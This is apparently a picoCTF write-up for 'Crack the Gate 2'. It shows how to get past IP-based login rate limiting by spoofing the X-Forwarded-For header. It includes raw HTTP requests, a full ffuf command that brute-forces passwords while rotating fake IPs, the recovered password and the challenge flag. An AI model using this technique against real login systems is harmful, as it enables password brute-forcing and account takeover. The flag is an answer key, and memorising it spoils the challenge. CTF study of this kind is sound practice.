# Crack the Gate 2

# Challenge

The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: [ctf-player@picoctf.org](mailto:ctf-player@picoctf.org) and uncover the hidden secret.

<img width="975" height="525" alt="image" src="https://github.com/user-attachments/assets/ed00cf82-1243-4c3a-8f96-9c4d8120fdd8" />

# Solution

## Testing

- Post Request:

```bash
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:49436
Content-Length: 52
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:49436
Referer: http://amiable-citadel.picoctf.net:49436/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"email":"ctf-player@picoctf.org","password":"test"}
```

- After 3 failed attempts, we start receiving the response below:

```bash
HTTP/1.1 429 Too Many Requests
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 85
ETag: W/"55-BeJP6dUudMpXjI0h8c0UICFySpk"
Date: Wed, 05 Nov 2025 20:07:57 GMT
Connection: close

{
    "success": false,
    "error": "Too many failed attempts. Please try again in 20 minutes."
}
```

## X-Forwarded-For

- Header for identifying the originating IP address of a client connecting to a web server through a proxy server
- We can manipulate this to bypass IP address rate-limiting as shown below:

<img width="1720" height="325" alt="image" src="https://github.com/user-attachments/assets/0516b992-b600-4c0c-95df-5f29cb187a05" />

- I wanted to fuzz both `password` and  `X-Forwarded-For` values on Caido but I wasn’t able to on the free version.
- Used ffuf instead:

```bash
┌──(kali㉿kali)-[~/gate]
└─$ ffuf -mode pitchfork \
  -w passwords.txt:PASS -w ips.txt:IP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: IP" \
  -d '{"email":"ctf-player@picoctf.org","password":"PASS"}' \
  -u "http://amiable-citadel.picoctf.net:59313/login" 
  
  [Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 205ms]
    * IP: 20.180.94.152
    * PASS: G9YKC9r1

[Status: 200, Size: 132, Words: 1, Lines: 1, Duration: 205ms]
    * IP: 126.197.120.157
    * PASS: X68f2Ftm

[Status: 200, Size: 17, Words: 1, Lines: 1, Duration: 205ms]
    * IP: 57.253.113.248
    * PASS: 7IAgfz9e
```

- We could filter by size using `-fs 17` if we wanted to
- `ctf-player@picoctf.org:X68f2Ftm`

## Flag

```
picoCTF{xff_byp4ss_brut3_3477bf15}
```
